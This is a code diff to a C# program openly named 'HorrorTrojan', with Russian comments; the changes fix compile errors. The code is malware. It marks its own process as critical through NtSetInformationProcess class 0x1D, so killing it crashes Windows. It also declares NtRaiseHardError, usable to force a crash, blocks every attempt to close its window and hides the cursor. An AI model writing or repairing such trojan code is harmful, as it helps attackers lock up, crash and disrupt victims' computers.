@@ -29,6 +29,8 @@ namespace HorrorTrojan
         [DllImport("ntdll.dll")]
         private static extern uint NtRaiseHardError(uint errorStatus, uint numberOfParameters, IntPtr unicodeStringParameterMask,
             IntPtr parameters, uint validResponseOptions, out uint response);
+        [DllImport("ntdll.dll")]
+        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
 
         [StructLayout(LayoutKind.Sequential)]
         public struct RECT { public int Left, Top, Right, Bottom; }
@@ -116,8 +118,8 @@ namespace HorrorTrojan
         private void SetupForm()
         {
             this.FormClosing += (s, e) => e.Cancel = true;
-            this.Cursor = Cursors.None;
-            // Скрываем курсор
+            // В .NET 4.8 нет Cursors.None, используем Cursors.Default и скрываем через Cursor.Hide()
+            this.Cursor = Cursors.Default;
             Cursor.Hide();
         }
 
@@ -301,9 +303,6 @@ namespace HorrorTrojan
         {
             try
             {
-                [DllImport("ntdll.dll")]
-                static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
-
                 int isCritical = critical ? 1 : 0;
                 NtSetInformationProcess(Process.GetCurrentProcess().Handle, 0x1D, ref isCritical, sizeof(int));
             }
